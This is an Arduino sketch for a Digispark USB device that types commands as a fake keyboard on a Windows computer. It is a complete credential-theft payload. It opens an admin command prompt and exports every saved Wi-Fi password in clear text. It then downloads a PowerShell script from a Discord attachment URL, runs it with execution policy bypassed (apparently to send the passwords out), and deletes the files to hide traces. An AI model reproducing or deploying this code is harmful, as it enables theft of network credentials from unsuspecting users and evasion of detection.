#include "DigiKeyboard.h" //TEST
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key
#define MOD_CONTROL_LEFT    1
#define MOD_SHIFT_LEFT      (1<<1)  //00000010
#define KEY_ARROW_LEFT 0x50

void setup() {}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.print("cmd"); //smallest cmd window possible
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT); //Enter cmd in ADMIN mode

  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cd C:\\Users"); //going to User directory
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("powershell -command \"& \{ iwr https://cdn.discordapp.com/attachments/788898643243040768/970499505151697026/Wi-sendmsg.ps1 -Outfile Wi-sendmsg.ps1\}\"");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File Wi-sendmsg.ps1");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell .\\Wi-sendmsg.ps1");

  DigiKeyboard.delay(500);
  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
